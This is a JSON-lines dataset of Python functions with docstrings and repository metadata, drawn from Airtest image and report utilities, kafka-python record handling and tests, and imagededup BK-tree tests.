{"docstring": "\"\"\"\n    \u5c06screen\u7684mask\u77e9\u5f62\u533a\u57df\u5237\u6210\u767d\u8272gbr(255, 255, 255).\n    \u5176\u4e2dmask\u533a\u57df\u4e3a: [x_min, y_min, x_max, y_max].\n    color: \u987a\u5e8f\u5206\u522b\u7684blue-green-red\u901a\u9053.\n    linewidth: \u4e3a-1\u65f6\u5219\u5b8c\u5168\u586b\u5145\u586b\u5145\uff0c\u4e3a\u6b63\u6574\u6570\u65f6\u4e3a\u7ebf\u6846\u5bbd\u5ea6.\n\"\"\"\n# \u5c06\u5212\u7ebf\u8fb9\u754c\u5916\u6269\uff0c\u4fdd\u8bc1\u7ebf\u5185\u533a\u57df\u4e0d\u88ab\u7ebf\u6240\u906e\u6321:\n", "func_signal": "def mask_image(img, mask, color=(255, 255, 255), linewidth=-1):\n", "code": "offset = int(linewidth / 2)\nreturn cv2.rectangle(img, (mask[0] - offset, mask[1] - offset), (mask[2] + linewidth, mask[3] + linewidth), color, linewidth)", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\n    \u51fd\u6570\u4f7f\u56fe\u7247\u53ef\u987a\u65f6\u9488\u6216\u9006\u65f6\u9488\u65cb\u8f6c90\u3001180\u3001270\u5ea6.\n    \u9ed8\u8ba4clockwise=True\uff1a\u987a\u65f6\u9488\u65cb\u8f6c\n\"\"\"\n\n", "func_signal": "def rotate(img, angle=90, clockwise=True):\n", "code": "def count_clock_rotate(img):\n    # \u9006\u65f6\u9488\u65cb\u8f6c90\u00b0\n    rows, cols = img.shape[:2]\n    rotate_img = np.zeros((cols, rows))\n    rotate_img = cv2.transpose(img)\n    rotate_img = cv2.flip(rotate_img, 0)\n    return rotate_img\n\n# \u5c06\u89d2\u5ea6\u65cb\u8f6c\u8f6c\u5316\u4e3a\u9006\u65f6\u9488\u65cb\u8f6c90\u00b0\u7684\u6b21\u6570:\ncounter_rotate_time = (4 - angle / 90) % 4 if clockwise else (angle / 90) % 4\nfor i in range(int(counter_rotate_time)):\n    img = count_clock_rotate(img)\n\nreturn img", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "# script filepath\n", "func_signal": "def main(args):\n", "code": "path, name = script_dir_name(args.script)\nrecord_list = args.record or []\nlog_root = decode_path(args.log_root) or decode_path(os.path.join(path, LOGDIR))\nstatic_root = args.static_root or STATIC_DIR\nstatic_root = decode_path(static_root)\nexport = decode_path(args.export) if args.export else None\nlang = args.lang if args.lang in ['zh', 'en'] else 'en'\nplugins = args.plugins\n\n# gen html report\nrpt = LogToHtml(path, log_root, static_root, export_dir=export, script_name=name, lang=lang, plugins=plugins)\nrpt.report(HTML_TPL, output_file=args.outfile, record_list=record_list)", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\nGenerate data for the report page\n:param output_file: The file name or full path of the output file, default HTML_FILE\n:param record_list: List of screen recording files\n:return:\n\"\"\"\n", "func_signal": "def report_data(self, output_file=None, record_list=None):\n", "code": "self._load()\nsteps = self._analyse()\n\nscript_path = os.path.join(self.script_root, self.script_name)\ninfo = json.loads(get_script_info(script_path))\n\nrecords = [os.path.join(LOGDIR, f) if self.export_dir\n           else os.path.abspath(os.path.join(self.log_root, f)) for f in record_list]\n\nif not self.static_root.endswith(os.path.sep):\n    self.static_root = self.static_root.replace(\"\\\\\", \"/\")\n    self.static_root += \"/\"\n\ndata = {}\ndata['steps'] = steps\ndata['name'] = self.script_root\ndata['scale'] = self.scale\ndata['test_result'] = self.test_result\ndata['run_end'] = self.run_end\ndata['run_start'] = self.run_start\ndata['static_root'] = self.static_root\ndata['lang'] = self.lang\ndata['records'] = records\ndata['info'] = info\ndata['log'] = self.get_relative_log(output_file)\ndata['console'] = self.get_console(output_file)\n# \u5982\u679c\u5e26\u6709<>\u7b26\u53f7\uff0c\u5bb9\u6613\u88abhighlight.js\u8ba4\u4e3a\u662f\u7279\u6b8a\u8bed\u6cd5\uff0c\u6709\u53ef\u80fd\u5bfc\u81f4\u9875\u9762\u663e\u793a\u5f02\u5e38\uff0c\u5c1d\u8bd5\u66ff\u6362\u6210\u4e0d\u5e38\u7528\u7684{}\ninfo = json.dumps(data).replace(\"<\", \"{\").replace(\">\", \"}\")\ndata['data'] = info\nreturn data", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\nStart the RotationWatcher daemon thread\n\nReturns:\n    None\n\n\"\"\"\n", "func_signal": "def start(self):\n", "code": "self._install_and_setup()\n\ndef _refresh_by_ow():\n    try:\n        return self.session.orientation\n    except WDAError as err:\n        if err.status == 6:\n            self.iosHandle._fetchNewSession()\n            self.session = self.iosHandle.session\n            return self.session.orientation\n        else:\n            return self.last_result\n    except ValueError as err:\n        import traceback\n        print(traceback.format_exc())\n        return self.last_result\n\ndef _run():\n    while not self._stopEvent.isSet():\n        time.sleep(1)\n        ori = _refresh_by_ow()\n        if ori is None:\n            break\n        elif self.last_result == ori:\n            continue\n        LOGGING.info('update orientation %s->%s' %\n                     (self.last_result, ori))\n        self.last_result = ori\n\n        # exec cb functions\n        for cb in self.ow_callback:\n            try:\n                cb(ori)\n            except:\n                LOGGING.error(\"cb: %s error\" % cb)\n                traceback.print_exc()\n\nself.roundProcess = threading.Thread(\n    target=_run, name=\"rotationwatcher\")\n# self._t.daemon = True\nself.roundProcess.start()", "path": "Airtest/airtest/core/ios/rotation.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\u6839\u636e\u56fe\u7247\u8def\u5f84\uff0c\u5c06\u56fe\u7247\u8bfb\u53d6\u4e3acv2\u7684\u56fe\u7247\u5904\u7406\u683c\u5f0f.\"\"\"\n", "func_signal": "def imread(filename, flatten=False):\n", "code": "if not os.path.isfile(filename):\n    raise FileNotExistError(\"File not exist: %s\" % filename)\n\n# choose image readin mode: cv2.IMREAD_UNCHANGED=-1, cv2.IMREAD_GRAYSCALE=0, cv2.IMREAD_COLOR=1,\nreadin_mode = cv2.IMREAD_GRAYSCALE if flatten else cv2.IMREAD_COLOR\n\nif PY3:\n    img = cv2.imdecode(np.fromfile(filename, dtype=np.uint8), readin_mode)\nelse:\n    filename = filename.encode(sys.getfilesystemencoding())\n    img = cv2.imread(filename, readin_mode)\n\nreturn img", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "# if has roataion watcher stop it\n", "func_signal": "def teardown(self):\n", "code": "if self.roundProcess:\n    self._stopEvent.set()", "path": "Airtest/airtest/core/ios/rotation.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\u5728\u53ef\u7f29\u653e\u7a97\u53e3\u91cc\u663e\u793a\u56fe\u7247.\"\"\"\n", "func_signal": "def show(img, title=\"show_img\", test_flag=False):\n", "code": "cv2.namedWindow(title, cv2.WINDOW_NORMAL)\ncv2.imshow(title, img)\nif not test_flag:\n    cv2.waitKey(0)\ncv2.destroyAllWindows()", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\" \u89e3\u6790log\u6210\u53ef\u6e32\u67d3\u7684dict \"\"\"\n", "func_signal": "def _analyse(self):\n", "code": "steps = []\nchildren_steps = []\n\nfor log in self.log:\n    depth = log['depth']\n\n    if not self.run_start:\n        self.run_start = log.get('data', {}).get('start_time', '') or log[\"time\"]\n    self.run_end = log[\"time\"]\n\n    if depth == 0:\n        # single log line, not in stack\n        steps.append(log)\n    elif depth == 1:\n        step = deepcopy(log)\n        step[\"__children__\"] = children_steps\n        steps.append(step)\n        children_steps = []\n    else:\n        children_steps.insert(0, log)\n\ntranslated_steps = [self._translate_step(s) for s in steps]\nreturn translated_steps", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\" \u7528jinja2\u6e32\u67d3html\"\"\"\n", "func_signal": "def _render(template_name, output_file=None, **template_vars):\n", "code": "env = jinja2.Environment(\n    loader=jinja2.FileSystemLoader(STATIC_DIR),\n    extensions=(),\n    autoescape=True\n)\nenv.filters['nl2br'] = nl2br\nenv.filters['datetime'] = timefmt\ntemplate = env.get_template(template_name)\nhtml = template.render(**template_vars)\n\nif output_file:\n    with io.open(output_file, 'w', encoding=\"utf-8\") as f:\n        f.write(html)\n    LOGGING.info(output_file)\n\nreturn html", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"translate single step\"\"\"\n", "func_signal": "def _translate_step(self, step):\n", "code": "name = step[\"data\"][\"name\"]\ntitle = self._translate_title(name, step)\ncode = self._translate_code(step)\ndesc = self._translate_desc(step, code)\nscreen = self._translate_screen(step, code)\ninfo = self._translate_info(step)\nassertion = self._translate_assertion(step)\n\n# set test failed if any traceback exists\nif info[0]:\n    self.test_result = False\n\ntranslated = {\n    \"title\": title,\n    \"time\": step[\"time\"],\n    \"code\": code,\n    \"screen\": screen,\n    \"desc\": desc,\n    \"traceback\": info[0],\n    \"log\": info[1],\n    \"assert\": assertion,\n}\nreturn translated", "path": "Airtest/airtest/report/report.py", "commit_date": "2020-09-25 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\u5199\u51fa\u56fe\u7247\u5230\u672c\u5730\u8def\u5f84\uff0c\u538b\u7f29\"\"\"\n", "func_signal": "def imwrite(filename, img, quality=10, max_size=None):\n", "code": "if PY2:\n    filename = filename.encode(sys.getfilesystemencoding())\npil_img = cv2_2_pil(img)\ncompress_image(pil_img, filename, quality, max_size=max_size)", "path": "Airtest/airtest/aircv/aircv.py", "commit_date": "2020-09-24 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "\"\"\"\nTransform the coordinates original --> upright\n\nArgs:\n    tuple_xy: coordinates (x, y)\n    tuple_wh: screen width and height\n    orientation: orientation\n\nReturns:\n    transformed coordinates (x, y)\n\n\"\"\"\n", "func_signal": "def ori_2_up(tuple_xy, tuple_wh, orientation):\n", "code": "x, y = tuple_xy\nw, h = tuple_wh\n\n# no need to do changing\n# ios touch point same way of image\n\nreturn x, y", "path": "Airtest/airtest/core/ios/rotation.py", "commit_date": "2020-07-01 00:00:00", "repo_name": "AirtestProject/Airtest", "stars": 7730, "license": "apache-2.0", "language": "python", "size": 214272}
{"docstring": "# Copy of `_read_key_value`, but uses memoryview\n", "func_signal": "def _decompress(self, key_offset):\n", "code": "pos = key_offset\nkey_size = struct.unpack_from(\">i\", self._buffer, pos)[0]\npos += self.KEY_LENGTH\nif key_size != -1:\n    pos += key_size\nvalue_size = struct.unpack_from(\">i\", self._buffer, pos)[0]\npos += self.VALUE_LENGTH\nif value_size == -1:\n    raise CorruptRecordException(\"Value of compressed message is None\")\nelse:\n    data = self._buffer[pos:pos + value_size]\n\ncompression_type = self.compression_type\nself._assert_has_codec(compression_type)\nif compression_type == self.CODEC_GZIP:\n    uncompressed = gzip_decode(data)\nelif compression_type == self.CODEC_SNAPPY:\n    uncompressed = snappy_decode(data.tobytes())\nelif compression_type == self.CODEC_LZ4:\n    if self._magic == 0:\n        uncompressed = lz4_decode_old_kafka(data.tobytes())\n    else:\n        uncompressed = lz4_decode(data.tobytes())\nreturn uncompressed", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# Requires a subscription\n", "func_signal": "def test_group_protocols(coordinator):\n", "code": "try:\n    coordinator.group_protocols()\nexcept Errors.IllegalStateError:\n    pass\nelse:\n    assert False, 'Exception not raised when expected'\n\ncoordinator._subscription.subscribe(topics=['foobar'])\nassert coordinator.group_protocols() == [\n    ('range', ConsumerProtocolMemberMetadata(\n        RangePartitionAssignor.version,\n        ['foobar'],\n        b'')),\n    ('roundrobin', ConsumerProtocolMemberMetadata(\n        RoundRobinPartitionAssignor.version,\n        ['foobar'],\n        b'')),\n    ('sticky', ConsumerProtocolMemberMetadata(\n        StickyPartitionAssignor.version,\n        ['foobar'],\n        b'')),\n]", "path": "kafka-python/test/test_coordinator.py", "commit_date": "2020-09-30 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# The Java test only cover the differences between the deprecated\n# constructors, so I'm skipping them but doing some other basic testing.\n\n# In short, metrics should be equal IFF their name, group, and tags are\n# the same. Descriptions do not matter.\n", "func_signal": "def test_MetricName():\n", "code": "name1 = MetricName('name', 'group', 'A metric.', {'a': 1, 'b': 2})\nname2 = MetricName('name', 'group', 'A description.', {'a': 1, 'b': 2})\nassert name1 == name2\n\nname1 = MetricName('name', 'group', tags={'a': 1, 'b': 2})\nname2 = MetricName('name', 'group', tags={'a': 1, 'b': 2})\nassert name1 == name2\n\nname1 = MetricName('foo', 'group')\nname2 = MetricName('name', 'group')\nassert name1 != name2\n\nname1 = MetricName('name', 'foo')\nname2 = MetricName('name', 'group')\nassert name1 != name2\n\n# name and group must be non-empty. Everything else is optional.\nwith pytest.raises(Exception):\n    MetricName('', 'group')\nwith pytest.raises(Exception):\n    MetricName('name', None)\n# tags must be a dict if supplied\nwith pytest.raises(Exception):\n    MetricName('name', 'group', tags=set())\n\n# Because of the implementation of __eq__ and __hash__, the values of\n# a MetricName cannot be mutable.\ntags = {'a': 1}\nname = MetricName('name', 'group', 'description', tags=tags)\nwith pytest.raises(AttributeError):\n    name.name = 'new name'\nwith pytest.raises(AttributeError):\n    name.group = 'new name'\nwith pytest.raises(AttributeError):\n    name.tags = {}\n# tags is a copy, so the instance isn't altered\nname.tags['b'] = 2\nassert name.tags == tags", "path": "kafka-python/test/test_metrics.py", "commit_date": "2018-11-18 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Encode an integer to a varint presentation. See\nhttps://developers.google.com/protocol-buffers/docs/encoding?csw=1#varints\non how those can be produced.\n\n    Arguments:\n        num (int): Value to encode\n\n    Returns:\n        bytearray: Encoded presentation of integer with length from 1 to 10\n             bytes\n\"\"\"\n# Shift sign to the end of number\n", "func_signal": "def encode_varint_1(num):\n", "code": "num = (num << 1) ^ (num >> 63)\n# Max 10 bytes. We assert those are allocated\nbuf = bytearray(10)\n\nfor i in range(10):\n    # 7 lowest bits from the number and set 8th if we still have pending\n    # bits left to encode\n    buf[i] = num & 0x7f | (0x80 if num > 0x7f else 0)\n    num = num >> 7\n    if num == 0:\n        break\nelse:\n    # Max size of endcoded double is 10 bytes for unsigned values\n    raise ValueError(\"Out of double range\")\nreturn buf[:i + 1]", "path": "kafka-python/benchmarks/varint_speed.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# Configure Kafka child process\n", "func_signal": "def start(self):\n", "code": "properties = self.tmp_dir.join(\"kafka.properties\")\njaas_conf = self.tmp_dir.join(\"kafka_server_jaas.conf\")\nproperties_template = self.test_resource(\"kafka.properties\")\njaas_conf_template = self.test_resource(\"kafka_server_jaas.conf\")\n\nargs = self.kafka_run_class_args(\"kafka.Kafka\", properties.strpath)\nenv = self.kafka_run_class_env()\nif self.sasl_enabled:\n    opts = env.get('KAFKA_OPTS', '').strip()\n    opts += ' -Djava.security.auth.login.config={}'.format(jaas_conf.strpath)\n    env['KAFKA_OPTS'] = opts\n    self.render_template(jaas_conf_template, jaas_conf, vars(self))\n\ntimeout = 5\nmax_timeout = 120\nbackoff = 1\nend_at = time.time() + max_timeout\ntries = 1\nauto_port = (self.port is None)\nwhile time.time() < end_at:\n    # We have had problems with port conflicts on travis\n    # so we will try a different port on each retry\n    # unless the fixture was passed a specific port\n    if auto_port:\n        self.port = get_open_port()\n    self.out('Attempting to start on port %d (try #%d)' % (self.port, tries))\n    self.render_template(properties_template, properties, vars(self))\n\n    self.child = SpawnedService(args, env)\n    self.child.start()\n    timeout = min(timeout, max(end_at - time.time(), 0))\n    if self._broker_ready(timeout) and self._scram_user_present(timeout):\n        break\n\n    self.child.dump_logs()\n    self.child.stop()\n\n    timeout *= 2\n    time.sleep(backoff)\n    tries += 1\n    backoff += 1\nelse:\n    raise RuntimeError('Failed to start KafkaInstance before max_timeout')\n\n(self._client,) = self.get_clients(1, client_id='_internal_client')\n\nself.out(\"Done!\")\nself.running = True", "path": "kafka-python/test/fixtures.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# metadata update on init\n", "func_signal": "def test_init(client, coordinator):\n", "code": "assert client.cluster._need_update is True\nassert WeakMethod(coordinator._handle_metadata_update) in client.cluster._listeners", "path": "kafka-python/test/test_coordinator.py", "commit_date": "2020-09-30 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"Compress batch to be ready for send\"\"\"\n", "func_signal": "def build(self):\n", "code": "self._maybe_compress()\nreturn self._buffer", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Upper bound estimate of record size.\n\"\"\"\n", "func_signal": "def estimate_size_in_bytes(cls, magic, compression_type, key, value):\n", "code": "assert magic in [0, 1], \"Not supported magic\"\n# In case of compression we may need another overhead for inner msg\nif compression_type:\n    return (\n        cls.LOG_OVERHEAD + cls.record_overhead(magic) +\n        cls.record_size(magic, key, value)\n    )\nreturn cls.LOG_OVERHEAD + cls.record_size(magic, key, value)", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# The `topic` fixture is included because\n# 0.8.2 brokers need a topic to function well\n", "func_signal": "def test_consumer(kafka_broker, topic):\n", "code": "consumer = KafkaConsumer(bootstrap_servers=get_connect_str(kafka_broker))\nconsumer.poll(500)\nassert len(consumer._client._conns) > 0\nnode_id = list(consumer._client._conns.keys())[0]\nassert consumer._client._conns[node_id].state is ConnectionStates.CONNECTED\nconsumer.close()", "path": "kafka-python/test/test_consumer_group.py", "commit_date": "2019-08-23 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Actual size of message to add\n\"\"\"\n", "func_signal": "def size_in_bytes(self, offset, timestamp, key, value, headers=None):\n", "code": "assert not headers, \"Headers not supported in v0/v1\"\nmagic = self._magic\nreturn self.LOG_OVERHEAD + self.record_size(magic, key, value)", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"Returns seconds (float) remaining before next heartbeat should be sent\"\"\"\n", "func_signal": "def time_to_next_heartbeat(self):\n", "code": "time_since_last_heartbeat = time.time() - max(self.last_send, self.last_reset)\nif self.heartbeat_failed:\n    delay_to_next_heartbeat = self.config['retry_backoff_ms'] / 1000\nelse:\n    delay_to_next_heartbeat = self.config['heartbeat_interval_ms'] / 1000\nreturn max(0, delay_to_next_heartbeat - time_since_last_heartbeat)", "path": "kafka-python/kafka/coordinator/heartbeat.py", "commit_date": "2017-12-21 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"\nReturn a string category for the metric.\n\nThe category is made up of this reporter's prefix and the\nmetric's group and tags.\n\nExamples:\n    prefix = 'foo', group = 'bar', tags = {'a': 1, 'b': 2}\n    returns: 'foo.bar.a=1,b=2'\n\n    prefix = 'foo', group = 'bar', tags = None\n    returns: 'foo.bar'\n\n    prefix = None, group = 'bar', tags = None\n    returns: 'bar'\n\"\"\"\n", "func_signal": "def get_category(self, metric):\n", "code": "tags = ','.join('%s=%s' % (k, v) for k, v in\n                sorted(metric.metric_name.tags.items()))\nreturn '.'.join(x for x in\n                [self._prefix, metric.metric_name.group, tags] if x)", "path": "kafka-python/kafka/metrics/dict_reporter.py", "commit_date": "2016-08-03 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# no need to wait for scram user if scram is not used\n", "func_signal": "def _scram_user_present(self, timeout):\n", "code": "if not self.sasl_enabled or not self.sasl_mechanism.startswith('SCRAM-SHA-'):\n    return True\nreturn self.child.wait_for(self.scram_pattern, timeout=timeout)", "path": "kafka-python/test/fixtures.py", "commit_date": "2019-12-29 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"0 for CreateTime; 1 for LogAppendTime; None if unsupported.\n\nValue is determined by broker; produced messages should always set to 0\nRequires Kafka >= 0.10 / message version >= 1\n\"\"\"\n", "func_signal": "def timestamp_type(self):\n", "code": "if self._magic == 0:\n    return None\nelif self._attributes & self.TIMESTAMP_TYPE_MASK:\n    return 1\nelse:\n    return 0", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# RecordAccumulator encodes messagesets internally\n", "func_signal": "def encode(cls, items, prepend_size=True):\n", "code": "if isinstance(items, (io.BytesIO, KafkaBytes)):\n    size = Int32.decode(items)\n    if prepend_size:\n        # rewind and return all the bytes\n        items.seek(items.tell() - 4)\n        size += 4\n    return items.read(size)\n\nencoded_values = []\nfor (offset, message) in items:\n    encoded_values.append(Int64.encode(offset))\n    encoded_values.append(Bytes.encode(message))\nencoded = b''.join(encoded_values)\nif prepend_size:\n    return Bytes.encode(encoded)\nelse:\n    return encoded", "path": "kafka-python/kafka/protocol/message.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Number of bytes needed to encode an integer in variable-length format.\n\"\"\"\n", "func_signal": "def size_of_varint_1(value):\n", "code": "value = (value << 1) ^ (value >> 63)\nres = 0\nwhile True:\n    res += 1\n    value = value >> 7\n    if value == 0:\n        break\nreturn res", "path": "kafka-python/benchmarks/varint_speed.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"0 for CreateTime; 1 for LogAppendTime; None if unsupported.\n\nValue is determined by broker; produced messages should always set to 0\nRequires Kafka >= 0.10 / message version >= 1\n\"\"\"\n", "func_signal": "def timestamp_type(self):\n", "code": "if self.magic == 0:\n    return None\nelif self.attributes & self.TIMESTAMP_TYPE_MASK:\n    return 1\nelse:\n    return 0", "path": "kafka-python/kafka/protocol/message.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Append message to batch.\n\"\"\"\n", "func_signal": "def append(self, offset, timestamp, key, value, headers=None):\n", "code": "assert not headers, \"Headers not supported in v0/v1\"\n# Check types\nif type(offset) != int:\n    raise TypeError(offset)\nif self._magic == 0:\n    timestamp = self.NO_TIMESTAMP\nelif timestamp is None:\n    timestamp = int(time.time() * 1000)\nelif type(timestamp) != int:\n    raise TypeError(\n        \"`timestamp` should be int, but {} provided\".format(\n            type(timestamp)))\nif not (key is None or\n        isinstance(key, (bytes, bytearray, memoryview))):\n    raise TypeError(\n        \"Not supported type for key: {}\".format(type(key)))\nif not (value is None or\n        isinstance(value, (bytes, bytearray, memoryview))):\n    raise TypeError(\n        \"Not supported type for value: {}\".format(type(value)))\n\n# Check if we have room for another message\npos = len(self._buffer)\nsize = self.size_in_bytes(offset, timestamp, key, value)\n# We always allow at least one record to be appended\nif offset != 0 and pos + size >= self._batch_size:\n    return None\n\n# Allocate proper buffer length\nself._buffer.extend(bytearray(size))\n\n# Encode message\ncrc = self._encode_msg(pos, offset, timestamp, key, value)\n\nreturn LegacyRecordMetadata(offset, crc, size, timestamp)", "path": "kafka-python/kafka/record/legacy_records.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\"Compressed messages should pass in bytes_to_read (via message size)\notherwise, we decode from data as Int32\n\"\"\"\n", "func_signal": "def decode(cls, data, bytes_to_read=None):\n", "code": "if isinstance(data, bytes):\n    data = io.BytesIO(data)\nif bytes_to_read is None:\n    bytes_to_read = Int32.decode(data)\n\n# if FetchRequest max_bytes is smaller than the available message set\n# the server returns partial data for the final message\n# So create an internal buffer to avoid over-reading\nraw = io.BytesIO(data.read(bytes_to_read))\n\nitems = []\nwhile bytes_to_read:\n    try:\n        offset = Int64.decode(raw)\n        msg_bytes = Bytes.decode(raw)\n        bytes_to_read -= 8 + 4 + len(msg_bytes)\n        items.append((offset, len(msg_bytes), Message.decode(msg_bytes)))\n    except ValueError:\n        # PartialMessage to signal that max_bytes may be too small\n        items.append((None, None, PartialMessage()))\n        break\nreturn items", "path": "kafka-python/kafka/protocol/message.py", "commit_date": "2020-09-07 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "\"\"\" Decode an integer from a varint presentation. See\nhttps://developers.google.com/protocol-buffers/docs/encoding?csw=1#varints\non how those can be produced.\n\n    Arguments:\n        buffer (bytes-like): any object acceptable by ``memoryview``\n        pos (int): optional position to read from\n\n    Returns:\n        (int, int): Decoded int value and next read position\n\"\"\"\n", "func_signal": "def decode_varint_1(buffer, pos=0):\n", "code": "value = 0\nshift = 0\nmemview = memoryview(buffer)\nfor i in range(pos, pos + 10):\n    try:\n        byte = _read_byte(memview, i)\n    except IndexError:\n        raise ValueError(\"End of byte stream\")\n    if byte & 0x80 != 0:\n        value |= (byte & 0x7f) << shift\n        shift += 7\n    else:\n        value |= byte << shift\n        break\nelse:\n    # Max size of endcoded double is 10 bytes for unsigned values\n    raise ValueError(\"Out of double range\")\n# Normalize sign\nreturn (value >> 1) ^ -(value & 1), i + 1", "path": "kafka-python/benchmarks/varint_speed.py", "commit_date": "2020-02-05 00:00:00", "repo_name": "dpkp/kafka-python", "stars": 5459, "license": "apache-2.0", "language": "python", "size": 5749}
{"docstring": "# Give a tree as input and check that for a query, validity flag is 0\n", "func_signal": "def test_get_next_candidates_invalid():\n", "code": "hash_dict, dist_func = initialize_for_bktree()\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nquery = '5'\n_, validity, _ = bk._get_next_candidates(query, bk.dict_all[bk.ROOT], tolerance=1)\nassert not validity", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
{"docstring": "# initialize root node and add 1 new node, check it goes as root's child and has it's parent as root\n", "func_signal": "def test_insert_tree():\n", "code": "_, dist_func = initialize_for_bktree()\nhash_dict = {'a': '9', 'b': 'D'}\nbk = BKTree(hash_dict, dist_func)\nassert bk.ROOT == 'a'\nassert 'b' in list(bk.dict_all['a'].children.keys())\nassert bk.dict_all['b'].parent_name == 'a'", "path": "imagededup/tests/test_bktree.py", "commit_date": "2019-09-17 00:00:00", "repo_name": "idealo/imagededup", "stars": 4898, "license": "apache-2.0", "language": "python", "size": 22857}
